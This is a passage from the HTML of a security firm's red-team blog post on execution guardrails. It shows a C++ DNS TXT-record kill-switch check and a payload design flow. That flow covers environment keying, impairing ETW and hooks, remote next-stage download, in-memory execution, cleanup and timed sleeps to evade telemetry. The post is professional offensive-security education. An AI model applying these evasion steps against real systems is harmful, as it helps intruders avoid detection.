    <span class="hljs-keyword">if</span> (status != ERROR_SUCCESS) {
        <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>;
    }

    std::string record = txt_record-&gt;Data.TXT.pStringArray[<span class="hljs-number">0</span>];

    <span class="hljs-built_in">DnsRecordListFree</span>(txt_record, DnsFreeRecordListDeep);

    <span class="hljs-keyword">return</span> record;
}</code></pre><p class="MsoNormal">By doing this, we have control over when the payload can trigger. It is also worth noting that by disabling the staging component externally, you would also achieve this. Me personally, I like to have both.</p><h2 id="Payload">1.6&nbsp;Payload&nbsp;Design</h2><p class="MsoNormal">Putting this all together with a valid implant, I built out the following diagram to show my process when working with payloads.</p><div class="my-p56 flex justify-center text-center"><picture class=" inline-block"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=1280&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=3b6caed1d25565862612e3172d32a25f, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=cd84dc6304bb869d92953364d64805cb 1.5x"><source type="image/webp" media="(min-width: 64rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=1280&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=18d595c011b8f48ec64ce75eee0df41b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=3c3691c3a22a102c7d668c2e62cf6010 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=1024&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=ac7990fd5f98b1f70b07b698479aaf41, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=cd84dc6304bb869d92953364d64805cb 1.5x"><source type="image/webp" media="(min-width: 48rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=1024&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=a8aef36ed001cbab559f8566d3aff37b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=3c3691c3a22a102c7d668c2e62cf6010 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=720&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=a1e3fedd02191bf40b75714b855b73a3, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=cd84dc6304bb869d92953364d64805cb 1.5x"><source type="image/webp" media="(min-width: 20rem)" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=720&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=8daedfd144bbb5c1d8babb7e8ed61a0b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=3c3691c3a22a102c7d668c2e62cf6010 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=320&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=d64c516a2cca9deb027adb87a84126b9, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;fm=webp&amp;fit=max&amp;dm=1721828813&amp;s=cd84dc6304bb869d92953364d64805cb 1.5x"><source type="image/webp" srcset="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=4b4a9705579892f0f6e2dd04631c972b, https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=480&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=3c3691c3a22a102c7d668c2e62cf6010 1.5x"><img class="c-img opacity-0 transition-all duration-300" src="https://trusted-sec.transforms.svdcdn.com/production/images/Blog-assets/Execution_McGrath/Fig11_McGrath.png?w=320&amp;q=90&amp;auto=format&amp;fit=max&amp;dm=1721828813&amp;s=4b4a9705579892f0f6e2dd04631c972b" loading="lazy" x-data="image({mq1024:{width:320,height:396},mq768:{width:320,height:396},mq320:{width:320,height:396},DEFAULT:{width:320,height:396}})" :width="getSize()" :height="getSize('height')" alt="" width="320" height="396" style="opacity: 1;"></picture></div><p class="MsoNormal">Anything in green I consider mandatory; blue is situational and not always required. Granted, this blog is about two of the blue blocks; I do believe they may not always be suitable for that payload.</p><p class="MsoNormal">Walking through it, we start with the initial ‘is this the right host’ check. Within this, we can check hostnames, application versions, environmental variables, and so on. This is to make sure that this host is the one we want and not <span><strong><em>admin@ALICE-PC</em></strong></span>.</p><p class="MsoNormal">Next, we hit two blue blocks for environment keying and external keying. This is what was covered in this blog and will be checks like ‘can I list shares on X machine’. Following that, external keying is ‘can we at least reach out to our servers’; this provides us with a kill switch. The reason this one is blue is because you could just have this in ‘Payload Retrieval’.</p><p class="MsoNormal">We then hit a sequence of blocks that are not mentioned in this post but are fundamental when building a payload. Defensive impairment is marked as optional because you may not want to mess with detection mechanisms at this point. This will be things like ETW, DLL Notifications, hooks, whatever.</p><p class="MsoNormal">Once the keying is done, and any tampering is complete, we then hit payload retrieval. In its simplest form, a remote HTTP download of the next stage will suffice.</p><p class="MsoNormal">At this point, we have the correct environment, the kill switch is ready, and we’ve disabled telemetry and gotten our payload ready in memory for us to load. So, naturally, we hit our loading and executing mechanisms and then cleanup — cleanup being removing any artifacts from the previous steps.</p><p class="MsoNormal">As all this is happening, it may be worth sleeping between each step. The goal here is to not align your execution flow neatly up in the telemetry. By sleeping between each step, you give the host and process time to do OS things so that your payloads telemetry isn’t neatly aligned.</p><h2 id="Conclusion">1.7&nbsp;Conclusion</h2><p class="MsoNormal">For each of these sections, I showed the simplest solution. In an automated framework, you could add anywhere from 1 to 1,000 different keys per section if you needed to—this ultimately comes down to creativity.</p><p class="MsoNormal">The overall goal is to protect your payload from being reverse engineered and provide a kill switch, whilst also locking the payload into a specific environment so that it does not go out of scope. In my opinion, this is a mandatory process for red teamers.</p><p class="MsoNormal"><strong><em>But please note—if someone wants to reverse your payload, they will.</em></strong></p><h2>1.8<span>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span>References</h2><p class="MsoNormal"><a href="https://attack.mitre.org/techniques/T1480/001/">https://attack.mitre.org/techniques/T1480/001/</a></p><p class="MsoNormal"><a href="https://eprint.iacr.org/2017/928.pdf">https://eprint.iacr.org/2017/928.pdf</a></p><p class="MsoNormal"><a href="https://0xpat.github.io/Malware_development_part_5/">https://0xpat.github.io/Malware_development_part_5/</a></p><p class="MsoNormal"><a href="https://notes.netbytesec.com/2021/01/solarwinds-attack-sunbursts-dll.html">https://notes.netbytesec.com/2021/01/solarwinds-attack-sunbursts-dll.html</a></p></div><div class="mb-p24 mt-p56 pt-p32 border-t first:border-t-none"><div class="w-full"><p id="share-label" class="text-xs font-mono mb-p16">Share</p><ul id="share-icons" class="flex items-center" aria-describedby="share-label"><li class="ml-p12"><a href="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share URL" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-share"></use></svg></span><span class="sr-only">Share URL</span></a></li><li class="ml-p12"><a href="mailto:?subject=Check%20out%20this%20article%20from%20TrustedSec%21&amp;body=Execution%20Guardrails%3A%20No%20One%20Likes%20Unintentional%20Exposure%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share via Email" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-email"></use></svg></span><span class="sr-only">Share via Email</span></a></li><li class="ml-p12"><a href="http://www.facebook.com/sharer.php?u=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" target="_blank" title="Share on Facebook" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-facebook"></use></svg></span><span class="sr-only">Share on Facebook</span></a></li><li class="ml-p12"><a href="http://twitter.com/share?text=Execution%20Guardrails%3A%20No%20One%20Likes%20Unintentional%20Exposure%3A%20https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure" title="Share on X" rel="nofollow" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-twitter"></use></svg></span><span class="sr-only">Share on X</span></a></li><li class="ml-p12"><a href="https://www.linkedin.com/shareArticle?url=https%3A%2F%2Ftrustedsec.com%2Fblog%2Fexecution-guardrails-no-one-likes-unintentional-exposure&amp;mini=true" target="_blank" title="Share on LinkedIn" data-target="https://trustedsec.com/blog/execution-guardrails-no-one-likes-unintentional-exposure"><span class="inline-block"><svg role="presentation" class="c-icon fill-black hover:fill-gibson w-p24 h-p24 transition duration-300"><use xlink:href="/ui/icons.svg?1.26#icon-linkedin"></use></svg></span><span class="sr-only">Share on LinkedIn</span></a></li></ul></div></div></div></div></div></div></section></div>
		</main>

		
		




  
<div class="c-modal fixed inset-0 z-100" x-comp="modal" x-data="modal({id:'modal-component'})" x-show="$store.modal.show" x-trap="$store.modal.show" x-bind:aria-hidden="!$store.modal.show" @keydown="keyPress($event)" x-transition:enter="c-modal-enter" x-transition:enter-start="c-modal-enter-start" x-transition:enter-end="c-modal-enter-end" x-transition:leave="c-modal-leave" x-transition:leave-start="c-modal-leave-start" x-transition:leave-end="c-modal-leave-end" aria-hidden="true" style="display: none;">
    <div class="w-full h-full bg-overlay fixed inset-0 z-0" tabindex="-1">

    <div class="relative z-10 flex flex-col w-full h-full justify-center items-center p-p12 mq768:p-none">
      <div id="modal-component" class="c-modal-box relative outline-none false w-full m-p24 max-w-p768" :class="modalClass(true)" :tabindex="($store.modal.show) ? '-1' : false" :aria-labelledby="showHeading() ? 'modal-component-title' : false" :aria-label="getLabel()" @focus="activate()" aria-role="dialog" x-ref="dialog">
        
          
        
        
          <div class="c-content p-p32" tabindex="-1" x-ref="content"></div>
        
        <button class="absolute z-50 overflow-hidden w-p24 h-p24 flex items-center justify-center border-black border top-p24 right-p24 group hover:bg-black" @click="closeModal()">
          <svg role="presentation" class="c-icon h-p12 w-p12 group-hover:fill-white"><use xlink:href="/ui/icons.svg?1.26#icon-close"></use></svg>
          <span class="sr-only">Close</span>
        </button>
        <button x-show="$store.modal.transcript" class="text-btn text-white uppercase tracking-widest px-p8 py-p16" @click="showTranscript($event)" x-text="$store.modal.showTranscript ? 'Hide Transcript' : 'Show Transcript'" style="display: none;">Show Transcript</button>
      </div>
      <div x-show="$store.modal.showTranscript" class="relative -top-ms bg-white text-segment w-full max-w-p768 mx-auto overflow-auto px-sm false m-p24" :class="modalClass()" x-ref="transcript" style="display: none;">
        <div x-collapse.duration.700ms="" style="height: 0px; overflow: hidden;">
          <div class="py-p32 mq768:px-p32" id="modal-transcript" tabindex="0"></div>
        </div>
      </div>
    </div>

  </div>
  </div>
		<!-- Start cookieyes banner --> 
 
<!-- End cookieyes banner -->

		
	


</body></html>